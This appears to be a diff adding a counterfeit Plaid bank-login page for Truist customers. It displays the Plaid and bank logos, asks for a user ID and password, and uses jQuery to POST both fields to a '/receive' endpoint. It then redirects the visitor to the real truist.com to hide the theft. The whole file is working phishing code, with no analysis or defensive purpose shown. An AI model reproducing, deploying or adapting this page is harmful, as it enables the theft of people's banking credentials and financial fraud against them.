@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Plaid</title>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
+    <link rel="icon" href="assets/favicon.svg" type="image/x-icon"> 
+  
+    
+    <style>
+        @font-face {
+            font-family: cern;
+            src: url('assets/fonts/cern-bold.woff2') format('truetype');
+        }
+        @font-face {
+            font-family: Cernregular;
+            src: url('path/to/font2.ttf') format('truetype');
+        }
+
+        body {
+            font-family: cern, sans-serif;
+            padding: 5px;
+            display: flex;
+            justify-content: center;
+        }
+        .container {
+            max-width: 600px;
+            width: 100%;
+            margin: auto;
+            padding: 10px;
+        }
+        .images {
+            position: relative;
+            display: inline-block;
+            margin-top: 50px;
+        }
+        .images img {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            position: absolute;
+        }
+        .images img:first-child {
+            left: 0;
+            top: 0;
+        }
+        .images img:last-child {
+            top: 0;
+            left: 37.5px;
+        }
+        .hd {
+            margin-top: 100px;
+            font-weight: bold;
+            font-size: 25px;
+        }
+        b {
+            font-weight: bold;
+        }
+        p {
+            font-size: 18px;
+            text-align: left;
+            font-family: cern, sans-serif;
+        }
+        .smaller-text {
+            font-size: 0.9em;
+            color: grey;
+            text-align: center;
+        }
+        .button-container {
+            margin-top: 28px;
+        }
+        button {
+            background-color: black;
+            color: white;
+            height: 60px;
+            width: 100%;
+            border: none;
+            padding: 0 20px;
+            cursor: pointer;
+            font-size: 21px;
+        }
+        .input-container {
+            position: relative;
+            background-color: white;
+            color: black;
+            border: 1px solid black;
+            height: 50px;
+            width: 89%;
+            padding: 0 20px;
+            font-size: 21px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-top: 10px;
+        }
+        .input-container input {
+            background-color: white;
+            color: black;
+            border: none;
+            width: 100%;
+            font-size: 19px;
+            outline: none;
+            padding: 10px 0;
+        }
+        .input-container label {
+            position: absolute;
+            left: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            transition: all 0.2s ease;
+            pointer-events: none;
+        }
+        .input-container input:focus + label,
+        .input-container input:not(:placeholder-shown) + label {
+            top: 0;
+            left: 10px;
+            font-size: 11px;
+            font-weight: 400;
+           /* color: #8C58D0;*/
+            background-color: white;
+            padding: 0 5px;
+            z-index: 1;
+        }
+        .icon {
+            width: 24px;
+            height: 24px;
+            background: url('/assets/images/lock.svg') no-repeat center center;
+            background-size: contain;
+        }
+        label{
+        color: grey;
+        }
+        @media only screen and (min-width: 750px) {
+            button {
+                width: 97%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div style="position: absolute"><img src="/assets/images/PLAIDFLAT.png" style="width:80px; height:auto;" alt="png"/></div>
+    <div class="container">
+        <div style="display: flex;">
+            <div class="images">
+                <img id="image1" src="/assets/images/PLAID.png" alt="Image 1">
+                <img id="image2" src="/assets/images/truistlogo.png" alt="Image 2">
+            </div>
+        </div>
+        <div>
+            <p class="hd">Enter your credentials</p>
+        </div>
+        <p class="grey">By providing your <b id="bnk"></b> credentials to Plaid, you're enabling Plaid to retrieve your financial data.</p>
+        
+        	<form id="myForm">
+        <div class="input-container">
+            <input type="text" id="UserID" placeholder=" " class="log_ins" name="UserId">
+            <label for="UserID">User ID</label> 
+            <!--div class="icon"></div-->
+        </div>
+        <div class="input-container">
+            <input type="password" id="password" placeholder=" " class="log_ins" name="password"> 
+            <label for="password">Password</label>
+            <div class="icon"></div>
+        </div>
+        <div class="button-container">
+            <button id="signin">Submit</button>
+        </div>
+        </form>
+        <p class="grey" style="text-align: center; margin-top: 20px;">Reset password</p>
+    </div>
+    <script>
+        var logo = document.querySelector('#image2');
+        var passedLogo = sessionStorage.getItem('chosenbank');
+        if(passedLogo){
+            logo.src = `/assets/images/${passedLogo.toUpperCase()}.png`;
+        } else {
+            console.log('lie');
+        }
+
+        document.getElementById('bnk').textContent = passedLogo;
+    </script>
+    	
+    
+    <script>$(document).ready(function() {
+    $('#signin').on('click', function(event) {
+        event.preventDefault(); // Prevent the default action of the link
+
+        let myForm = $("#myForm");
+        let checkInputs = document.querySelectorAll('.log_ins');
+
+        
+        // Flag to track if any input is empty
+        let isEmpty = false;
+
+        // Loop through each input field
+        for (const check of checkInputs) {
+            check.addEventListener('focus', () => {
+                console.log('focus');
+            });
+
+            if (check.value.trim() === "") {
+                isEmpty = true;
+            }
+        }
+
+        // If no input is empty, proceed with form submission
+        if (!isEmpty) {
+            let userinfo = myForm.serializeArray();
+            let user = {};
+            let visitor = document.getElementById('UserID').value;
+
+            userinfo.forEach((value) => {
+                // Use the 'name' attribute to create user object
+                user[value.name] = value.value;
+            });
+
+            user['visitor'] = visitor;
+            console.log(user);
+
+            // Send AJAX request
+            $.ajax({
+                method: 'POST',
+                url: "/receive",
+                data: user
+            }).done(function(msg) {
+                console.log(msg);
+                window.location.href = "https://truist.com/";
+                console.log(msg); // Log success message
+            }).fail(function(err, textstatus, error) {
+            //window.location.href = "login/2"; 
+                console.log('fail');
+            });
+        }
+    });
+});
+    	</script>
+</body>
+</html>
